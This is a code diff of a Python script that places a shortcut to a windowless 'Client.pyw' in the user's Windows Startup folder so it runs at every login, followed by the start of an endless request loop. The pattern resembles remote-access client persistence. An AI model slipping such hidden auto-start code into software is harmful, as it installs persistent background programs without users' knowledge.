@@ -10,13 +10,16 @@ username = os.getlogin() #to get log in username
 source = os.listdir() # it return list of present files current in directory
 #now set the path of startup folder
 destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
+cwd = os.getcwd()
 
-def main(des):
+def main():
     path = os.path.join(destination, "Client.pyw - Shortcut.lnk")#here set the path along it's name 7 extension
     #now we have to set the link file source
-    target = r"C:\Users\Mayur\Desktop\Client.pyw"
+    target = r""+cwd+"\Client.pyw"
+    print(target)
     #now set the current file icon for it
-    icon = r"C:\Users\Mayur\Desktop\Client.pyw"
+    icon = r""+cwd+"\Client.pyw"
+    print(icon)
     for files in source:
         if files == "Client.pyw":
             #here we have to pass all objects we are created for sent icon,path & target etc
@@ -33,7 +36,10 @@ shortcut = 'Client.pyw - Shortcut.lnk'
 if shortcut in destination:
     pass
 else:
-    main(destination)
+    main()
+
+
+
 
 #first we write infinite loop for sending request and other operation
 while True: 
